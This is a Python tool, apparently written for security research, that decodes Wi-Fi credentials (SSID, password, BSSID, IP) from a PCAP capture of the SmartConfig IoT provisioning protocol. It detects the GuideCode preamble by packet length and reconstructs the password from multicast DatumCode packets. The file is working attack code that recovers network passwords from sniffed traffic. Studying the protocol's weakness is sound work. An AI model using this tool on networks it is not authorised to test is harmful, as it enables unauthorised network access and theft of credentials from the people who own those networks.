"""
NotSoSmartConfig.py - Decode SmartConfig credentials from a PCAP file

in depth analysis of the protocol:
https://arxiv.org/pdf/1811.03241.pdf

The configurator broadcast the GuideCode as a preamble so the IoT device
can recognize the pattern.

preamble GuideCode:
   guides[0] = 515; 559; 44 bytes extra when encrypted
   guides[1] = 514; 558; 44
   guides[2] = 513; 557; 44
   guides[3] = 512; 556; 44 


Then the configurator starts broadcasting the DatumCode.
The DatumCode is made in groups of 3 bytes:
- The first byte contains the top 4 bits of the Information byte.
- The second byte contains a counter to detect the Datum order since 
   they are transmitted via UDP over 802.11
- The third byte contains the bottom 4 bits of the Information byte.

example of DatumCode:
  173|  321|  189|   46|  322|  225|  110|  323|  254|  254|  324|  145|

00 85 01 19 00 95|00 06 01 1a 00 b9|00 46 01 1b 00 d6|00 d6 01 1c 00 69|
   ^^          ^^    ^^          ^^    ^^          ^^                ^^|
                U                 i                 f                 i|

effective data sent
 = totalLen (1 byte) 
 + apPwdLen (1 byte)
 + SsidCRC  (1 byte)
 + BssidCRC (1 byte)
 + totalXOR (1 byte)
 + ipAddr   (4 bytes)
 + apPwd    (variable)
 + apSSID   (variable)
 + apBSSID  (6 bytes)

"""

import sys
from binascii import unhexlify as unhex, hexlify as hhex
from os.path import isfile
from scapy.all import *

class WifiCredentials(object):
    def __init__(self, ssid, pwd, bssid=None, ip=None):
        self.ssid = ssid
        self.pwd = pwd
        self.bssid = bssid
        self.ip = ip
    
    @staticmethod
    def pprint(credz):
        if type(credz) is not WifiCredentials:
            raise NotSmartException('[E] Failed pretty-printing an object with type not equals to "WifiCredentials"')
        print("SSID: {}".format(credz.ssid))
        print("Pwd: {}".format(credz.pwd))
        if credz.bssid is not None:
            print("BSSID: {}".format(credz.bssid))
        if credz.ip is not None:
            print("IP: {}".format(credz.ip))
            
    def __str__(self):
        s = []
        s.append("ssid={}".format(self.ssid))
        s.append("pwd={}".format(self.pwd))
        if self.bssid is not None:
            s.append("bssid={}".format(self.bssid))
        if self.ip is not None:
            s.append("ip={}".format(self.ip))
        return "WifiCredentials({})".format(', '.join(s))
    
    def __repr__(self):
        return {'ssid':self.ssid, 'pwd':self.pwd, 'bssid':self.bssid, 'ip':self.ip}

class NotSmartException(Exception):
    pass
    
class NotSmart(object):
    preamble = [
        [515, 559],
        [514, 558],
        [513, 557],
        [512, 556]
    ]
    clearlen = 44
    
    def __init__(self, pcap_file, debug=False):
        if not isfile(pcap_file):
            raise NotSmartException("[E] File not found: {}. Specify at least one file as argument.".format(pcap_file))
        try:
            self.pcap = rdpcap(pcap_file)
        except scapy.error.Scapy_Exception as e:
            raise NotSmartException("[E] {}".format(e))
        self.debug = debug
        
    def decode(self):
        # Parse PCAP file
        packets = self.parse_pcap()
        # Detect the GuideCode and extract the following DatumCode sequence
        datum = self.get_datum_sequence(packets)
        # Reorder the DatumCode sequence
        datum = self.reorder(datum)
        # Convert lenghts in DatumCodes to a DatumCode hexstring
        datumstr = self.parse_datum(datum)
        # Convert the DatumCode hexstring to cleartext UTF-8
        result = self.datum_to_cleartext(datumstr)
        
        # Get all the juicy stuff
        pwd_len = int.from_bytes(result[1], 'big')
        ip = '.'.join([str(int.from_bytes(x, 'big')) for x in result[5:5+4]])
        pwd = b''.join(result[5+4:5+4+pwd_len]).decode()
        ssid = b''.join(result[5+4+pwd_len:-6]).decode()
        bssid = ':'.join([hhex(x).decode() for x in result[-6:]])
        
        return WifiCredentials(ssid, pwd, bssid, ip)
    
    def parse_pcap(self):
        filtered = []
        for packet in self.pcap:
            json = {}
            if self.debug: packet.show()
            if Dot11 in packet and '01:00:5e' in packet.addr1:
                # Encrypted 802.11 traffic to multicast MAC
                data = packet.data
                if data is None:
                    continue
                # packet.addr1 is the destination address
                # packet.addr2 is the AP's BSSID address
                # packet.addr3 is the source address
                json['dest'] = packet.addr1
                json['len'] = len(data)
                filtered.append(json)
            if Ether in packet and UDP in packet and '01:00:5e' in packet.dst:
                # Cleartext UDP traffic to multicast MAC
                data = packet.getlayer(Raw)
                if data is None:
                    continue
                json['dest'] = packet.dst
                json['len'] = len(data)
                filtered.append(json)

        if len(filtered) == 0:
            raise NotSmartException("[E] No multicast packet with destination MAC equals to \"01:00:5e:xx:xx:xx\" found inside PCAP")
        return filtered
    
    def get_datum_sequence(self, packets):
        """
        NotSoSmart-StateMachine

        s -> 0; searching for preamble/GuideCode
        s -> 1; starting GuideCode found 515
        s -> 2; found 514
        s -> 3; found 513
        s -> 4; GuideCode ending found 512
        s -> 5; read DatumCode
        """
        s = 0
        clearmode = False
        datum = []
        for pack in packets:
            packetlen = pack['len']
            if s == 5 and (packetlen in NotSmart.preamble[0] or 
                           packetlen in NotSmart.preamble[1] or 
                           packetlen in NotSmart.preamble[2] or 
                           packetlen in NotSmart.preamble[3]):
                # finished reading some datum
                s = 1
            elif packetlen in NotSmart.preamble[0]:
                # found starting guide
                s = 1
            elif s == 1 and packetlen in NotSmart.preamble[1]:
                s = 2
            elif s == 2 and packetlen in NotSmart.preamble[2]:
                s = 3
            elif s == 3 and packetlen in NotSmart.preamble[3]:
                s = 4
                clearmode = (packetlen == NotSmart.preamble[3][0])
            elif s == 4 and packetlen not in NotSmart.preamble[0]:
                # found starting datum
                s = 5
                datum.append({'dest': pack['dest'], 'len': packetlen if clearmode else packetlen - NotSmart.clearlen})
            elif s == 5:
                datum.append({'dest': pack['dest'], 'len': packetlen if clearmode else packetlen - NotSmart.clearlen})
        return datum

    def reorder(self, datum):
        # Fix the packet order
        ordered_lengths = {}
        current = datum[0]['dest'][-2:]
        triplet = []
        for element in datum:
            if current == element['dest'][-2:]:
                triplet.append(element['len'])
            else:
                current = element['dest'][-2:]
                triplet = [element['len']]
            if len(triplet) == 3:
                if ordered_lengths.get(triplet[1]) is None:
                    ordered_lengths[triplet[1]] = []
                if len(ordered_lengths[triplet[1]]) != 3:
                    ordered_lengths[triplet[1]] = triplet
        return ordered_lengths
    
    def parse_datum(self, datum):
        k = sorted(datum.keys())
        hexstr = []
        for index in k:
            if self.debug: print(datum[index])
            hexstr.extend(self.lenght_to_datum(datum[index][0]))
            hexstr.extend(self.lenght_to_datum(datum[index][-1]))
        return hexstr

    def lenght_to_datum(self, dat):
        dat = dat - 40
        high = dat >> 8
        low = dat & 0x00ff
        return ['{:02x}'.format(high), '{:02x}'.format(low)]

    def datum_to_cleartext(self, datum):
        clear = []
        for i in range(0, len(datum), 4):
            a = datum[i:i + 4]
            low = ord(unhex(a[-1]))
            high = ord(unhex(a[1]))
            clear.append(bytes([((high & 0xf) << 4) + (low & 0xf)]))
        return clear


if __name__ == "__main__":
    print("NotSoSmartConfig! - SmartConfig credentials decoder")
    pcap_file = sys.argv[1]
    try:
        ns = NotSmart(pcap_file)
        credz = ns.decode()
        if credz is not None:
            print("[!] Found WiFi credentials in Pcap!")
            WifiCredentials.pprint(credz)
    except NotSmartException as e:
        print(e)
